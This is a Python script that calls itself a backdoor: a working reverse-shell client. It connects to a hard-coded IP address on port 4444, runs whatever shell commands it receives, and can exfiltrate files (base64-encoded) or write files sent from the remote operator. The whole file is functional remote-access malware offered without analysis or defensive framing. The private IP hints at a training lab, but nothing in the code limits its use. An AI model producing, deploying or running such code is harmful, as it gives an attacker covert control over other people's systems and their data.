#!/usr/bin/env python
import socket
import subprocess
import json
import os
import base64

class Backdoor:
	def __init__(self,ip,port):
		self.connection=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip,port))

	def reliable_send(self,data):
		json_data=json.dumps(data)
		self.connection.send(json_data.encode('utf-8'))

	def reliable_recieve(self,expect_file_content=False):
		json_data=b""
		while True:
			try:
				chunk=self.connection.recv(1024)
				if not chunk:
					break
				json_data += chunk
				if expect_file_content:
					return json_data.decode('utf-8')
				else:
					return json.loads(json_data.decode('utf-8'))
			except ValueError:
				continue

	def execute_system_commands(self,command):
		return subprocess.check_output(str(command),shell=True,text=True)

	def changing_working_directory(self,path):
		os.chdir(path)
		return "[+] Changing working directory to :"+ path
	def read_file(self, path):
		with open(path, "rb") as file:
			file_data= base64.b64encode(file.read()).decode('utf-8')
			return file_data

	def write_file(self, path, content):
        # Fix padding if necessary
		missing_padding = len(content) % 4
		if missing_padding !=0:
			content += '=' * (4 - missing_padding)
        # Decode and write binary data
		try:
			with open(path, "wb") as file:
				file.write(base64.b64decode(content))
			return "[+] Upload successful"
		except Exception as e:
			return f"[-] Error writing file: {str(e)}"

	def run(self):
		while True:
			command=self.reliable_recieve()
			splited_command=command.split(" ")
			try:
			
				if command=="exit":
					self.connection.close()
					exit()
				elif splited_command[0]=="cd" and len(splited_command)>1:
					path = " ".join(splited_command[1:])
					command_result=self.changing_working_directory(path)
				elif splited_command[0] == "download" and len(splited_command) > 1:
					path = " ".join(splited_command[1:])
					command_result = self.read_file(path)
				elif splited_command[0] == "upload" and len(splited_command) > 1:
					path =splited_command[1]
					data=" ".join(splited_command[2:])
					command_result=self.write_file(path,data)

				else:
					command_result=self.execute_system_commands(command)
			except Exception as er:
				command_result=f"[-] Error during command execution (Backdoor):{str(er)}"
			self.reliable_send(command_result)
		


my_backdoor=Backdoor("192.168.56.129",4444)
my_backdoor.run()